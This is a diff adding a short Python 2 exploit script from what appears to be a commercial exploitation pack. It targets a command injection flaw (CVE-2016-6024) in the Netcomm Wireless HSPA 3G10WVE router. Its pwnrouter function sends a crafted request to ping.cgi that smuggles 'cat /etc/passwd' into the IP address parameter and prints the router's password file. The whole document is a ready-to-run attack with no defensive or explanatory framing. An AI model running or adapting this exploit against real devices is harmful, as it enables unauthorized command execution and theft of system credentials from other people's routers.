@@ -1,0 +1,48 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_netcommwireless_1'
+_vendor_ = 'netcomm wireless'
+_model_  = ['HSPA 3G10WVE']
+_vuln_   = 'Command injection vulnerability'
+_cve_    = 'CVE-2016-6024'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/ping.cgi?DIA_IPADDRESS=4.2.2.2;cat%%20/etc/passwd' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  print '[+] %s vulnerable' % host
+  print '%s' % nfo.getvalue()
+  return 
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
